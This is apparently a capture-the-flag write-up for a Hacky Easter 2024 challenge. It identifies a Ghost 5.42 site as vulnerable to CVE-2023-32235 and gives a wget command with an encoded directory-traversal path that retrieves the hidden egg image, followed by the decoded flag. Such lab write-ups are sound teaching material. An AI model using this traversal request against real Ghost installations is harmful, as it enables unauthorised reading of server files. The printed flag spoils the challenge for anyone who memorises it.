
### Challenge description
Ghostbusters go Egg Hunting!
Open their webpage and find the `egg.png`.
[Egg Busters web site](http://ch.hackyeaster.com:2407/)

### Solution
Browsing around the site there are some fake blog posts and some fake images. None of these are the flags.

Since there is so much focus on the framework Ghost, we do some googling and figure out there are some critical vulnerabilities in the Ghost framework

https://www.cvedetails.com/vendor/20613/Ghost.html

We figure out the ghost version in the received JS/HTML

<meta name="generator" content="Ghost 5.42" />

https://www.cvedetails.com/cve/CVE-2023-32235/

Directory traversal before 5.42.1 sounds pretty relevant.

We run the following command and get the flag

```
wget http://ch.hackyeaster.com:2407/assets/built%2F..%2F..%2F/egg.png

zbarimg egg.png
```

he2024{p4th_tr4v3rs4ls_st1ll_h4pp3ns}